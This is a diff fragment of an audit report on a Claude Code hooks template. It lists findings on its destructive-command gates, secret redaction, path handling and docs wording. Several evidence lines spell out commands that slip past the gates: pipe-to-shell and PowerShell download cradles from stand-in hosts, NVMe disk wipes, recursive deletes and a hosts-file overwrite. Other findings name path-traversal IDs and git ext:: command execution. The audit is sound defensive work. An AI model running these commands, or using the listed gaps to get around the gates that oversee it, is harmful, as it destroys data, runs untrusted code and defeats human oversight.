+  - evidence: If the hook's cwd ever differs from the project root, line 46 '[ ! -f .claude/settings.json ] && exit 0' silently skips rule re-injection, and line 116 writes .claude/.last-audit-nudge into whatever cwd is — sessionstart-cost-summary.sh:21 shows the pattern the suite already standardized on.
+- **SHOULD-FIX** — `.claude/lib/destructive-bash-patterns.sh:22` — Pipe-to-shell pattern only catches a bare `bash`/`sh` immediately after the pipe, missing the two most common real forms.
+  - evidence: Verified => allow: `curl -s http://x.sh | sudo bash` and `eval "$(curl -s http://x.sh)"`.
+- **SHOULD-FIX** — `.claude/lib/destructive-bash-patterns.sh:25` — Device-destruction patterns are hardcoded to legacy `/dev/sd[a-z]` naming, so NVMe targets pass.
+  - evidence: Verified => allow: `dd if=/dev/zero of=/dev/nvme0n1` (line 25 requires `of=/dev/sd[a-z]`) and `mkfs.ext4 /dev/nvme0n1p1` (line 26 requires `/dev/[a-z]+` with no digits).
+- **SHOULD-FIX** — `.claude/lib/destructive-powershell-patterns.sh:19` — Cmdlet-name-only matching means equivalent .NET and cmd.exe delete routes are invisible.
+  - evidence: Verified => allow: `[System.IO.Directory]::Delete("C:\foo",$true)` and `cmd /c rd /s /q C:\foo`.
+- **SHOULD-FIX** — `.claude/lib/destructive-powershell-patterns.sh:23` — The download-cradle pattern requires a literal `iwr|iex` pipe and misses the standard WebClient one-liner and system-file overwrite shapes.
+  - evidence: Verified => allow: `IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")` and `Set-Content C:\Windows\System32\drivers\etc\hosts -Value evil`.
+- **SHOULD-FIX** — `.claude/lib/generate-session-telemetry.sh:322` — session_id is used unvalidated as a filename component (also line 425), so a hostile transcript sessionId or CLAUDE_HOOK_SESSION_ID like '../../x' writes outside .claude/telemetry/ — violates the repo's own path-shape-guards-before-mutation rule.
+  - evidence: events_path = os.path.join(events_dir, f'{session_id}.jsonl'); session_id comes from ev['sessionId'] (line 261-262) or env argv[7] with no character/shape check, unlike the observation file which uses a sha256 pattern_id.
+- **SHOULD-FIX** — `.claude/lib/redact-capture.sh:70` — Redaction misses common secret shapes before content leaves the project: PASSWORD=/SECRET=/PASS= assignments, colon-form keys (api_key: sk-..., in YAML/JSON), and any token under 32 chars that isn't in KEY=/TOKEN=/Bearer form passes through unredacted.
+  - evidence: Only [A-Za-z_]*KEY=\S+, [A-Za-z_]*TOKEN=\S+, Bearer, Authorization:, home paths, and 32+-char base64 runs are matched (lines 70-78); 'PASSWORD=hunter2' or 'api_key: abc123' in a capture body ships verbatim via body_redacted.
+- **SHOULD-FIX** — `.claude/lib/shared-memory-lib.sh:24` — SM_PY probe is presence-only (command -v), so the Windows Store python execution-alias stub passes sm_have_python and every downstream python call fails with misleading REFUSED/malformed errors — the exact 'silent-inert' class this repo fixed by execution-probing in generate-session-telemetry.sh and receipt-render.sh (Phase 63).
+  - evidence: if command -v python >/dev/null 2>&1; then SM_PY="python" — no `"$_cand" -c 'pass'` validation; on a stock Windows box with the Store alias, redact-capture.sh returns 3 (malformed frontmatter) for every capture instead of 5 (no python).
+- **SHOULD-FIX** — `.claude/lib/shared-memory-lib.sh:128` — sm_write_event builds the destination from producer/key/date with no path-shape guard; keys derived from JSON fields — observation pattern_id and telemetry target_resource ('session:<id>') per shared-memory-produce.sh lines 55/76 — can contain '../' or '/' and write outside .claude/shared-memory/ (which the push layer then commits).
+  - evidence: dir="$SM_TREE/$producer/$uuid/$date"; dest="$dir/$key.json" with key taken verbatim from sm_json_field output; an observation file carrying pattern_id "../../../x" escapes the tree. Also breaks the CLAUDE.md 'path-shape guards before mutation' rule; sm_event_exists (line 117) additionally treats glob metacharacters in key as wildcards.
+- **COSMETIC** — `.claude/hooks/README.md:8` — Describes sessionstart-rules.sh as 'six jobs in one hook' but the script now has a seventh — the Phase 97 receipt-render --live status-strip refresh
+  - evidence: sessionstart-rules.sh:121-127 invokes .claude/scripts/receipt-render.sh --live as an undocumented seventh job; the README's enumerated list (1)-(6) omits it.
+- **COSMETIC** — `.claude/hooks/sessionend-cost-proposals.sh:71` — A kill -9 between tmp-file creation and os.replace leaves .tmp.<pid> litter in telemetry/ that is never garbage-collected
+  - evidence: tmp = state_path + f'.tmp.{os.getpid()}' (also lines 117, 192); the except-branch cleanup only runs on a caught exception — a hard kill mid-json.dump orphans the file and no later run sweeps *.tmp.* files.
+- **COSMETIC** — `.claude/hooks/sessionend-observe.sh:26` — INPUT=$(cat) blocks forever if the hook is run manually from a terminal without redirected stdin
+  - evidence: Claude Code always pipes the SessionEnd JSON payload, but a human debugging with 'bash sessionend-observe.sh' hangs on the open tty until Ctrl-D; '[ -t 0 ] || INPUT=$(cat)' style guard would avoid it.
+- **COSMETIC** — `.claude/hooks/sessionstart-rules.sh:6` — Header says 'Six pieces of work in one hook' but the body has seven — the Phase 97 receipt-render --live refresh (lines 121-127) is uncounted
+  - evidence: Lines 6-28 enumerate jobs 1-6; line 124 adds a seventh invocation (receipt-render.sh --live) documented only by an inline comment.
+- **COSMETIC** — `.claude/hooks/sessionstart-rules.sh:55` — jq read of compactPrompt has no stderr suppression or || true, unlike every other sub-step
+  - evidence: A malformed .claude/settings.json makes jq print a parse error to the hook's stderr (PROMPT stays empty, hook still completes) — inconsistent with the 2>/dev/null || true discipline used at lines 61/66/71/113.
+- **COSMETIC** — `.claude/lib/generate-session-telemetry.sh:20` — Header comment says the observation is written to .claude/observations/token-telemetry-<session_id>.json, but since Phase 65 the code writes <pattern_id>.json (line 479) — stale doc.
+  - evidence: Line 20-23 vs line 473-479: obs_path = os.path.join(obs_dir, f'{obs_pid}.json') with a comment explicitly noting the old prefix was removed.
+- **COSMETIC** — `.claude/lib/generate-session-telemetry.sh:333` — Events JSONL and session rollup are written non-atomically (open 'w' + incremental writes), so a mid-run kill leaves a truncated file; only the observation uses tmp+os.replace.
+  - evidence: with open(events_path, 'w', ...) at 333 and open(rollup_path, 'w', ...) at 430 vs the tmp/os.replace pattern at 515-519. Self-healing on re-run, hence cosmetic.
+- **COSMETIC** — `.claude/lib/redact-capture.sh:51` — A UTF-8 BOM at byte 0 makes the ^---\n frontmatter regex fail, so a BOM'd capture is REFUSED (exit 3); sibling readers (receipt-render) open with utf-8-sig.
+  - evidence: open(sys.argv[1], encoding="utf-8") + re.match(r"^---\n...") — ﻿ precedes the first ---. Fail-closed direction, so a skip not a leak.
+- **COSMETIC** — `.claude/lib/redact-capture.sh:77` — The 32+-char base64 catch-all also mangles legitimate long hex (full sha256/sha1 hashes) into <redacted-b64>, degrading shared body usefulness.
+  - evidence: r"[A-Za-z0-9+/]{32,}={0,2}" matches any 40/64-char hex commit hash. Over-redaction is the safe direction, hence cosmetic.
+- **COSMETIC** — `.claude/lib/redact-observation.sh:78` — If jq fails inside emit_redacted (e.g. file mutated between the pclass read and the emit), pipefail propagates jq's exit code 2, which collides with the documented 'REFUSED: local-only' code 2 for any caller that switches on codes.
+  - evidence: jq -aS ... 2>/dev/null | tr -d '\r' — with set -o pipefail, jq parse failure exits 2; header contract says 2 == local-only. Narrow race only, since a malformed file already fails the pclass read and returns 3.
+- **COSMETIC** — `.claude/lib/shared-memory-git.sh:48` — Clone/fetch URL from share-config.json is passed to git without `--` or a scheme allowlist; a URL beginning with '-' is parsed as a git option and an ext:: transport URL executes an arbitrary command.
+  - evidence: git clone --quiet "$url" "$dir" (also line 52). The URL is user-authored local config (share-enable), so the attacker must already write .claude/share-config.json — low real exposure, but `git clone -- "$url"` plus an https/ssh scheme check is cheap.
+
+### Wave E findings
+
+- **BLOCKER-for-strangers** — `docs/GETTING-STARTED.md:8` — Governs-the-person phrasing: "it stops you only at the few doors that don't reopen, and when it stops you, it tells you why" — the system acting on the person, twice in one sentence, in the opening frame of the doc.
+  - evidence: docs/GETTING-STARTED.md:8-9. What the sentence describes is accurate (the PreToolUse gates on irreversible commands), but the grammatical object being stopped is the reader, which is the governs-the-person register the wedge review targets. Reframe on the action, not the person: "it gates only the few actions that can't be undone, and every gate says why it fired." Reported at the mandated severity for wedge-category hits; if the caller reads "stops you" as plain gate description rather than person-governance, downgrade to SHOULD-FIX.
+- **BLOCKER-for-strangers** — `docs/GETTING-STARTED.md:101` — Wedge grep hit: "nudge" — behavior-psychology vocabulary on a stranger-facing surface where the mandate expects zero.
+  - evidence: docs/GETTING-STARTED.md:101: "the manager-optimizer nudge (needs draft proposals or a session-count threshold)". The word names a session-start reminder line, so the fix is a rename, not a redesign — "the manager-optimizer reminder line" or "prompt" carries the same meaning without the behavioral-economics term. (This is the only wedge-vocabulary hit across all five files; note the internal hooks README at template/.claude/hooks/README.md:10 uses the same word, so a rename should cover both for consistency, though that file was out of scope.)
+- **BLOCKER-for-strangers** — `docs/ROADMAP.md:198` — Literal wedge-grep hit: 'overriding' in 'overriding a deny rule'
+  - evidence: 'Disabling a hook, skipping an audit, overriding a deny rule — the user gets explicit language'. Same class as STORY.md:65 and reported per the report-any-hit instruction; same context assessment applies — action-enumeration in the transparency principle, retained through the Phase 84 zero-verdict, likely sanctioned register. Owner adjudication requested rather than assumed.
+- **BLOCKER-for-strangers** — `docs/STORY.md:65` — Literal wedge-grep hit: 'overriding' in 'overriding a deny rule'
+  - evidence: 'disabling a hook, skipping an audit, overriding a deny rule — the system says it, in plain language'. Reported as BLOCKER per the report-any-hit instruction. Context assessment for the adjudicator: this is an action-enumeration inside the guard-rails-transparency principle (parallel to 'disabling a hook'), not person-behavior-psychology framing, and it survived the Phase 84 sweep that recorded 'widened wedge grep ZERO across README + live docs/' — so it appears to be sanctioned register rather than residue. Owner call needed on whether the bare word is tolerable on a public surface.
+- **SHOULD-FIX** — `README.md:41` — "Everything runs from SessionStart and SessionEnd hooks... nothing fires mid-task" is contradicted by the shipped product: two PreToolUse destructive-command gates and a PreCompact backup hook fire mid-task, and GETTING-STARTED.md advertises exactly that on the same stranger path.
+  - evidence: README.md:41-42 says "Everything runs from SessionStart and SessionEnd hooks. No cron, no daemons, nothing fires mid-task." But template/.claude/settings.json.template wires four events including PreToolUse (line 32) and PreCompact (line 21); template/.claude/hooks/pretooluse-bash-safety.sh and pretooluse-powershell-safety.sh intercept commands mid-task; docs/GETTING-STARTED.md:25-27 says "7 hook scripts wired across four events... two destructive-command gates on Bash/PowerShell." A skeptical stranger reading both docs sees a direct contradiction. Scope the sentence to the observation features listed above it (e.g. "The watchers all run from SessionStart/SessionEnd; the only mid-task hooks are the two destructive-command gates and the pre-compact backup").
+- **SHOULD-FIX** — `docs/GETTING-STARTED.md:13` — Stale count: "a fresh run reports ~82 files" — the template now ships 92 files under .claude/ plus top-level templates, so a fresh install today reports well above 82.
+  - evidence: docs/GETTING-STARTED.md:13. Current template/.claude contains 92 files, plus 5 top-level *.template files, 2 docs templates, a .gitignore template, and the generated version marker. The "~" hedge does not cover a ~15-20% drift; re-run install.sh against a scratch repo and transcribe the current number (same fix opportunity as the 13-vs-14 script count — both came from an older-version transcript).
+- **SHOULD-FIX** — `docs/GETTING-STARTED.md:20` — Stale count: claims "13 mechanical wrappers" in .claude/scripts/ but the template ships 14.
+  - evidence: docs/GETTING-STARTED.md:20-22. Glob of template/.claude/scripts/*.sh returns 14 files — receipt-render.sh (added Phase 103, the --pin receipts card) is the fourteenth and postdates this count. A stranger who counts after install finds the doc off by one on its very first inventory claim.
+- **SHOULD-FIX** — `docs/ROADMAP.md:325` — Stale present-tense claim: Tier 3 'plan-mode gate ... Current default' contradicts the shipped Phase 104 default
+  - evidence: Both shipped gate-config.json copies (template and dogfood) now set friction.tier_3.lane = 'flow_with_receipt' with the five irreversibility classes (deletion, history_rewrite, config_value_change, template_structural, values_call) as surface_choice overrides — the Phase 104 flip the CHANGELOG records ('the DEFAULT is flow-with-receipt ... in BOTH gate-config copies'). A first-time visitor cross-reading ROADMAP's appendix against the CHANGELOG or the shipped config gets contradictory pictures of the default friction posture. The adjacent line-329 Phase 85 description (docs_only/mechanical_fix overrides, defaults encoding then-current behavior) is framed as history and reads acceptably, but it compounds the pre-104 impression while line 325 stays present-tense. Fix is a truth-mark on 'Current default'.
+- **COSMETIC** — `docs/ARCHITECTURE.md:34` — template/.claude/ layout diagram omits several shipped directories and gate-config.json
+  - evidence: Diagram shows agents/skills/scripts/commands/hooks/settings.json.template; actual template/.claude/ also ships gate-config.json, lib/, captures/, observations/, recommendations/, specs/, telemetry/. gate-config.json in particular is load-bearing (friction lanes, audits registry) and referenced by ROADMAP, so its absence from the layout is the most noticeable gap.
+- **COSMETIC** — `docs/ARCHITECTURE.md:53` — Full-project-layout tree omits template/PLUGINS.md.template, which ships alongside the four templates it does list
+  - evidence: Tree lists CLAUDE.md.template, CLAUDE_MANAGER.md.template, ROUTING.md.template, .gitignore.template; actual template/ also contains PLUGINS.md.template. Same tree's docs/ listing names 5 files while docs/ holds ~16, including STORY.md — the identity doc ROADMAP explicitly points readers to — so a stranger cross-checking the tree against the repo sees an incomplete map.
+- **COSMETIC** — `docs/PLUGINS-GETTING-STARTED.md:121` — "shipped as the v1.5 flow" invites confusion with install version 1.1.5 for a stranger who hasn't read ROADMAP's tier scheme.
+  - evidence: docs/PLUGINS-GETTING-STARTED.md:121 says "shipped as the v1.5 flow above (Phases 76-78)" while the installed version a stranger sees at session start is 1.1.5 (VERSION file, and the GETTING-STARTED transcript). ROADMAP.md does define v1.5 as the ecosystem-integration tier distinct from v1.1.5, so the claim is internally coherent — but on this page there is no gloss, and 'v1.5' vs '1.1.5' differ by one dot. A parenthetical like "(the ROADMAP v1.5 ecosystem tier, not install version 1.1.5)" removes the ambiguity.
+- **COSMETIC** — `docs/ROADMAP.md:97` — Path imprecision: 'Ships with scripts/plugin-discovery.sh' points at the wrong directory
+  - evidence: Repo-top scripts/ contains only install.sh and update.sh; the shipped script lives at template/.claude/scripts/plugin-discovery.sh (mirrored in .claude/scripts/). A stranger following the stated path finds nothing.
 
 ## Wave G — close
 
